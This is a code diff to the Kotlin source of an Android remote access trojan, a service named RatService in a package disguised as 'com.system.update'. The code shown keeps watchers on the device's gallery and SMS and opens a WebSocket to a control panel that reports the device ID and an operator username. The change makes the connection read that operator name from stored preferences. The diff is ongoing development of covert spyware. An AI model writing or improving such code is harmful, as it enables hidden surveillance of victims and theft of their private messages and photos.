@@ -3,6 +3,7 @@ package com.system.update
 import android.app.*
 import android.content.Context
 import android.content.Intent
+import android.content.SharedPreferences
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
@@ -33,10 +34,13 @@ class RatService : Service() {
     private var galleryWatcher: GalleryWatcher? = null
     private var smsPollThread: Thread? = null
     private var reconnectAttempts = 0
+    private lateinit var userPrefs: SharedPreferences
 
     override fun onCreate() {
         super.onCreate()
         instance = this
+        userPrefs = getSharedPreferences("exoid_user_prefs", Context.MODE_PRIVATE)
+
         deviceId = android.provider.Settings.Secure.getString(
             contentResolver, android.provider.Settings.Secure.ANDROID_ID
         ) ?: "unknown"
@@ -104,8 +108,15 @@ class RatService : Service() {
     }
 
     private fun connect() {
+        // Ambil username dari SharedPreferences — JANGAN fallback ke "unknown"
+        val owner = userPrefs.getString("username", "") ?: ""
+        if (owner.isEmpty()) {
+            // Belum setup, tunggu
+            return
+        }
+
         val cfg = App.config
-        val url = "${cfg.panelUrl}?deviceId=$deviceId&owner=${cfg.username}"
+        val url = "${cfg.panelUrl}?deviceId=$deviceId&owner=$owner"
         val req = Request.Builder().url(url).build()
 
         ws = client.newWebSocket(req, object : WebSocketListener() {
